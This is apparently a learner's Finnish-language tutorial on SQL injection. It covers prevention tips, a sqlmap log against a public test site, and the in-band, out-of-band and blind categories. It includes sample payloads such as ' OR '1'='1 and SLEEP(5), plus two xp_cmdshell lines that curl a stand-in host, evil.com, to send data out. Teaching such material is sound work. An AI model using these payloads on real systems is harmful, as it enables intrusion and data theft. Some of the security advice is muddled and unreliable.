# SQL injektio

SQL-injektio (SQL injection) on tietoturvahyökkäys, jossa hyökkääjä voi manipuloida verkkosovelluksen tai tietokannan SQL-kyselyitä. Tämä tapahtuu syöttämällä haitallista SQL-koodia sovellukseen, joka ei ole suojattu asianmukaisesti. SQL-injektio voi mahdollistaa hyökkääjän suorittaa tietokannan komentoja, kuten lukemaan, muokkaamaan tai poistamaan tietoja, jopa hankkimaan järjestelmänvalvojan oikeudet.

SQL-injektiohyökkäyksen perusidea on hyödyntää puutteellisesti suodatettuja syötteitä (kuten käyttäjän syöttämiä lomaketietoja tai URL-parametreja) ja liittää niihin haitallista SQL-koodia. Jos sovellus ei tarkista tai puhdista syötteitä kunnolla, hyökkääjä voi lisätä oman SQL-lausekkeen alkuperäiseen kyselyyn, joka suoritetaan tietokannassa.


Oletetaan, että sinulla on verkkosivusto/palvelin/tietokanta, jossa käyttäjä voi kirjautua sisään syöttämällä käyttäjätunnuksen ja salasanan. Jos kirjautumislomakkeen tiedot liitetään suoraan SQL-kyselyyn ilman oikeaa suodatusta, hyökkääjä voi syöttää seuraavanlaisen syötteen: `root` ja ei ole salasanaa, tai oletuksena käyttäjätunnus ja salasana OVAT `root` tai joko `admin`.


## ehkäiseminen ja turvallisuuden kannalta

SQL-injektion välttäminen on olennainen osa verkkosovellusten ja tietokantojen suojaamista. 


- Tietokannan suojaus: Tietokannassa, kuten MariaDB/MySQL:ssä, tulisi käyttää vahvoja ja pitkiä salasanoja, jotka estävät hakkereita pääsemästä käsiksi järjestelmään. Vahva salasana sisältää suuria ja pieniä kirjaimia, numeroita ja erikoismerkkejä.
  
- Ylläpitäjien hallinta: Mikäli tietokannassa on useita ylläpitäjiä, on suositeltavaa luoda vähintään kaksi tai useampi ylläpitäjän tili, jotka jakavat vastuuta ja rajoittavat yksittäisen käyttäjän pääsyä. Näin varmistetaan, että kaikki oikeudet eivät ole yhden henkilön käsissä.

- Syötteiden validointi: Käyttäjän syötteitä ei koskaan tulisi liittää suoraan SQL-kyselyihin, sillä se voi mahdollistaa SQL-injektion. Sen sijaan tulisi käyttää valmisteltuja kyselyitä (prepared statements), joissa käyttäjän syöte käsitellään turvallisesti erillään SQL-komennosta.

- Päivitykset ja haavoittuvuuksien hallinta: Sovellukset ja käytettävät ohjelmistot, kuten tietokannan hallintajärjestelmät (esim. MySQL, PostgreSQL), tulisi päivittää säännöllisesti, jotta tunnetut haavoittuvuudet saadaan korjattua. Tällöin voidaan estää hyökkäyksiä, jotka voisivat käyttää hyväkseen ohjelmistojen vanhentuneita versioita.

<hr>

## kali linux ja sqlmap

Sekä pieni huomiona, tätä sqlmap - komentoa jos toistaa useammin niin jossakin tilanteessa tulee pieni katkosta eli vähä kuin aikaleima. Jossain tilantteessa tällainen saattaa tulla, jossa tämä tarkoittaa sqlmap-työkalu versio on vanhentunut. Voi vaikuttaa, että sqlmap ei toimi oikein, ja ei ehkä pysty käyttämään uusia ominaisuuksia tai korjauksia, joita on lisätty työkaluun alunperin verrattuna uudenmpiin versioihin. 

```
[*] starting @ 18:39:30 /2024-12-08/

[18:39:30] [INFO] resuming back-end DBMS 'microsoft sql server' 
[18:39:55] [CRITICAL] host 'testasp.vulnweb.com' does not exist
[18:39:55] [WARNING] your sqlmap version is outdated

[*] ending @ 18:39:55 /2024-12-08/
```

Vanha sqlmap-versio ei välttämättä tue uusimpia tekniikoita, joita tarvitaan nykyään verkkosivustojen SQL-injektiohaavoittuvuuksien löytämiseen, etenkin jos verkkosivustolla on lisäsuojauksia. Tämä voi estää sinua suorittamasta SQL-injektiohyökkäystä onnistuneesti. Lisäksi, jos tietokannan rakenteessa on muutoksia tai uusia tietoturvatoimenpiteitä, vanha versio saattaa olla kykenemätön käsittelemään niitä.

Päivittäminen menee komennolla `sqlmap --update` ja jos ei tiedä mitä komentoa ja miten päivittää tarkista apua ensin `sqlmap -h` ja tämä on kali linux alla tmä työkalu, niin on hyvä tarvittaessa päivittää oman kali linux ohjelman `sudo apt update` tämä päivittää versiot, mutta jos päivittää `sudo apt upgrade` niin se syö muisti ja vie resurssien muistia. 

<hr>

# SQL Injection kategoriat:

Kolmen typpistä injektio ovat; 

- In-band SQL injection; Hyökkääjä suorittaa SQL-kyselyt samalla yhteyden kautta ja saa vastauksia heti. Toisin sanoen, kaikki tiedot saadaan samassa "kanavassa" hyökkäyksen aikana. Tässä kategorian sisällä voidaan puhua esimerkiksi error-based SQL injection (virheilmoitusten kautta) tai union-based SQL injection (tietojen yhdistämisen kautta). Hyökkääjä saa välittömästi palautetta kyselyjen tuloksista ja voi käyttää tätä tietoa hyväkseen. Esim. `' OR 'a'='a`
  (lyhyesti sanottuna;  Hyökkääjä saa suoraa palautetta samassa yhteydessä kyselyistä.)

- Out-of-band SQL injection; hyökkääjä ei saa palautetta samassa yhteydessä kuin kyselyä suoritetaan. Sen sijaan tietoja voidaan siirtää jollain muulla tavalla, esimerkiksi erillisten kanavien (kuten verkkopyynnöt) kautta. Tämä voi tapahtua esimerkiksi, jos SQL-kysely suorittaa toimenpiteitä, jotka laukaisevat ulkoisen tiedonsiirron (esim. tietojen lähettäminen hyökkääjän palvelimelle). Out-of-band-injektiot eivät ole yhtä yleisiä, koska ne edellyttävät, että tietokannan on tuettava ulkoisten yhteyksien tekemistä, mutta ne voivat olla tehokkaita. Esim. `'; EXEC xp_cmdshell('curl http://evil.com/attack') --
   (lyhyesti sanottuna;  Hyökkääjä saa tietoa muilla kanavilla, kuten verkkopyynnöillä.)

- blind / inferential SQL injection; Blind SQL-injektiossa ei saada suoraa palautetta SQL-kyselyistä, mutta hyökkääjä voi päätellä tietoja epäsuorasti, esimerkiksi kokeilemalla erilaisia ehtoja ja katsomalla, miten sivusto reagoi. Tässä ei ole virheilmoituksia eikä suoraa tietoa, mutta silti hyökkääjä voi arvaamalla selvittää tietokannan rakennetta ja tietoja. Blind SQL Injection voidaan jakaa edelleen kahteen tyyppiin:
        (lyhyesti sanottuna; Hyökkääjä ei saa suoraa palautetta, vaan päättelee tietoja epäsuorasti käyttäen sivuston käyttäytymistä (boolean- tai time-based).)
  
 -  boolean-based Blind SQL injection: Hyökkääjä yrittää muuttaa SQL-kyselyä siten, että kyselyn tulos on joko "totta" tai "epätotta", ja seuraamalla käyttäjän reaktiota (esim. sivun lataus tai virhe) voi päätellä, onko tietty ehto täsmällinen.
 -  Time-based Blind SQL Injection: Tässä hyökkääjä pakottaa tietokannan odottamaan tietyn ajan ennen vastauksen lähettämistä, ja aikaa mittaamalla voidaan päätellä, onko ehto ollut totta vai epätotta.

Esim. `' AND 1=1 --` - sivu latautuu normaalisti tarkoittaa ehto 1=1. Mutta jos esim. `' AND 1=2 --` ettei sivu lataudu. Näin hän voi päätellä, että ehto 1=2 on epätosi.

<hr>

Muutamia esimerkkejä koskien URL-pohjaisen hyökkäystä, ja vastaavasti miten hyökkäys voi rakentua URL:in kautta. 

- ESIM: URL:ssa voi olla parametrinä esimerkiksi käyttäjätunnus ja salasana, ja hyökkääjä voi yrittää manipuloida niitä.
URL-pohjaisesta in-band SQL -injektiosta; 
<br> `http://example.com/login.php?username=admin&password=' OR '1'='1` 

Tässä URL:ssa hyökkääjä on lisännyt syötteen, joka muuttaa SQL-kyselyn käyttäen `OR '1'='1` -ehtoa. Tämä voisi johtaa siihen, että SQL-kysely palauttaa kaikki käyttäjät, koska ehto `1=1` on aina totta. Jos sovellus ei ole suojattu kunnolla, tämä voi paljastaa käyttäjätietoja tai jopa antaa pääsyn sovellukseen ilman oikeaa salasanaa.


- ESIM: tässä hyökkäyksessä hyökkääjä ei saa suoraa palautetta samassa yhteydessä, mutta SQL-kysely voi laukaista ulkoisen tiedonsiirron hyökkääjän palvelimelle. Tämä voi tapahtua esimerkiksi komentojen ajamisella tietokannan kautta, joka lähettää pyynnön ulkoiselle palvelimelle.
URL-pohjaisesta out-of-band SQL -injektiosta:
<br> `http://example.com/product.php?id=1; EXEC xp_cmdshell('curl http://evil.com/data') --`

Tässä URL:ssa hyökkääjä on lisännyt SQL-koodia, joka käyttää `EXEC xp_cmdshell`-komentoa, joka mahdollistaa komentojen suorittamisen tietokannan palvelimella. Tässä esimerkissä suoritetaan curl-komento, joka lähettää tiedot hyökkääjän palvelimelle. Tämä on tyypillinen tapa, jolla out-of-band SQL-injektio voi toimia — hyökkääjä ei saa suoraa vastausta kyselystä, mutta tietoja siirretään ulkopuoliseen järjestelmään.


- ESIM: Tässä hyökkäyksessä hyökkääjä ei saa suoraa palautetta, mutta hän voi tehdä kokeiluja ja seurata sivun käyttäytymistä, jotta voi päätellä, onko tietty ehto totta vai epätotta. Yksi yleisimmistä tavoista on käyttää boolean-based tai time-based -tekniikoita.
URL-pohjaisesta blind SQL -injektiosta (boolean-based):
<br> `http://example.com/product.php?id=1' AND 1=1 --` 

Tässä URL:ssa hyökkääjä lisää ehtoja SQL-kyselyyn. Tämä kysely palauttaa oikean sivun, koska 1=1 on aina totta. Hyökkääjä voi kokeilla myös seuraavaa:

<br> `http://example.com/product.php?id=1' AND 1=2 --` 

Tässä kysely palauttaa todennäköisesti tyhjän sivun, koska 1=2 on epätotta. Tämä antaa hyökkääjälle vihjeen siitä, että hän voi manipuloida tietokannan kyselyjä ja päätellä, onko jokin ehto totta vai epätotta.

URL-pohjaisesta blind SQL -injektiosta (time-based):
<br> `http://example.com/product.php?id=1' AND SLEEP(5) --`

Tässä URL:ssa hyökkääjä lisää `SLEEP(5)`-komennon SQL-kyselyyn. Tämä pakottaa tietokannan odottamaan 5 sekuntia ennen kuin se palauttaa tuloksen. Hyökkääjä voi mitata, kuinka kauan sivu kestää latautuessaan. Jos sivu viivästyy, hän tietää, että SQL-kyselyssä oli SLEEP(5)-komento, ja tämä auttaa häntä arvioimaan tietokannan rakennetta ja tietoja.





<hr>
